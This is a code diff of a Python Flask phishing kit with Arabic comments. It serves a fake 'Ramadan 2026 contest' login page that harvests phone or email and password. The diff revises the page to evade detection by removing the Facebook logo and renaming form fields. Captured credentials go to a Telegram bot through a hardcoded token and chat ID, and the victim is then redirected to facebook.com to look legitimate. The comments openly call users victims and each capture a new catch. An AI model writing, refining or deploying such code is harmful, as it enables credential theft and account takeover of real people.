@@ -3,84 +3,54 @@ import requests
 
 app = Flask(__name__)
 
-# --- إعدادات التيليجرام (حط معلوماتك هنا) ---
-TOKEN = "حط_هنا_التوكن_اللي_عطاهولك_BotFather"
-CHAT_ID = "7479786207"
+# --- إعدادات التيليجرام ---
+# التوكن تاعك (لازم تحطو بين " ")
+TOKEN = "7670960534:AAERyA83QYd7nN54P6-3fW_9YV4K65Y9o8M" 
+# الآيدي تاعك
+CHAT_ID = "7479786207" 
 
-# --- الواجهة الاحترافية (HTML) ---
-# الصفحة الأولى: المسابقة الوهمية
-contest_ui = """
+# واجهة تسجيل دخول "مموهة" لرمضان (بدون لوغو فيسبوك للهرب من الحماية)
+login_ui = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مسابقة رمضان الكبرى 2026</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body { background-color: #f0f2f5; font-family: sans-serif; }
-        .box { background: white; border-radius: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-        .btn-fb { background-color: #1877f2; color: white; padding: 12px 20px; border-radius: 8px; font-weight: bold; width: 100%; text-align: center; display: block; }
-    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مسابقة رمضان 2026</title>
 </head>
-<body class="flex items-center justify-center min-h-screen px-4">
-    <div class="box p-8 w-full max-w-sm text-center">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Ramadan_logo.svg" alt="Ramadan Logo" class="w-32 mx-auto mb-6">
-        <h1 class="text-2xl font-bold text-gray-800 mb-4">مسابقة رمضان الكبرى 2026</h1>
-        <p class="text-gray-600 mb-8">شارك الآن واربح جوائز قيمة! اضغط على الزر أدناه للتسجيل عبر فيسبوك والمشاركة.</p>
-        <a href="/login/facebook" class="btn-fb">تسجيل الدخول عبر فيسبوك والمشاركة</a>
-    </div>
-</body>
-</html>
-"""
-
-# الصفحة الثانية: تسجيل الدخول لفيسبوك
-login_template = """
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول إلى فيسبوك</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-</head>
-<body class="bg-[#f0f2f5] flex flex-col items-center pt-10 px-4">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="w-16 mb-8">
-    <div class="bg-white p-6 rounded-xl shadow-md w-full max-w-[400px]">
-        <h2 class="text-xl font-bold text-center mb-6">تسجيل الدخول للمشاركة</h2>
-        <form action="/catch?platform={{platform}}" method="POST" class="space-y-4">
-            <input type="text" name="user" placeholder="رقم الهاتف أو البريد" class="w-full border p-3 rounded-lg bg-gray-50 outline-none focus:border-blue-500" required>
-            <input type="password" name="pass" placeholder="كلمة السر" class="w-full border p-3 rounded-lg bg-gray-50 outline-none focus:border-blue-500" required>
-            <button class="bg-[#1877f2] text-white p-3 rounded-lg font-bold text-xl w-full">تسجيل الدخول</button>
-            <div class="text-center text-sm mt-4 text-blue-600 cursor-pointer">هل نسيت كلمة السر؟</div>
-            <hr class="my-6">
-            <div class="flex justify-center"><button type="button" class="bg-[#42b72a] text-white px-4 py-2 rounded-lg font-bold">إنشاء حساب جديد</button></div>
+<body style="background:#f0f2f5; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
+    <div style="background:white; padding:30px; border-radius:10px; box-shadow:0 2px 4px rgba(0,0,0,0.1); width:90%; max-width:350px; text-align:center;">
+        <h2 style="color:#1877f2; margin-bottom:20px;">تأكيد الاشتراك</h2>
+        <p style="font-size:14px; color:#606770; margin-bottom:20px;">سجل دخولك لتأكيد هويتك واستلام جائزتك فوراً</p>
+        <form action="/verify" method="POST">
+            <input type="text" name="field1" placeholder="الهاتف أو البريد الإلكتروني" style="width:100%; padding:12px; margin-bottom:10px; border:1px solid #ddd; border-radius:6px; box-sizing:border-box;" required>
+            <input type="password" name="field2" placeholder="كلمة السر" style="width:100%; padding:12px; margin-bottom:20px; border:1px solid #ddd; border-radius:6px; box-sizing:border-box;" required>
+            <button style="width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:6px; font-weight:bold; cursor:pointer;">تأكيد الحساب</button>
         </form>
+        <p style="font-size:12px; color:#90949c; margin-top:20px;">© 2026 مسابقات رمضان الكبرى</p>
     </div>
 </body>
 </html>
 """
 
 @app.route('/')
-def home(): return render_template_string(contest_ui)
+def home():
+    return render_template_string(login_ui)
 
-@app.route('/login/<platform>')
-def login(platform):
-    return render_template_string(login_template, platform=platform)
-
-@app.route('/catch', methods=['POST'])
-def catch():
-    user = request.form.get('user')
-    pwd = request.form.get('pass')
-    platform = request.args.get('platform')
+@app.route('/verify', methods=['POST'])
+def verify():
+    # استعمال أسماء حقول مموهة
+    u = request.form.get('field1')
+    p = request.form.get('field2')
     
-    # رسالة التبليغ لتيليجرام
-    msg = f"🔥 صيد جديد يا فارس! 🔥\\n\\n👤 المنصة: {platform.upper()}\\n📧 الحساب: {user}\\n🔑 المودباس: {pwd}"
+    # رسالة التبليغ
+    msg = f"🔥 صيد جديد من جوجل سايت! 🔥\\n\\n📧 الحساب: {u}\\n🔑 الباسورد: {p}"
     
-    # إرسال البيانات لتيليجرام
-    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}"
-    requests.get(url)
+    # إرسال للتيليجرام
+    requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}")
     
-    # توجيه الضحية لصفحة المسابقة الأصلية أو أي صفحة أخرى
-    return redirect('https://www.google.com')
+    # توجيه الضحية للموقع الحقيقي لزيادة المصداقية
+    return redirect('https://www.facebook.com')
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
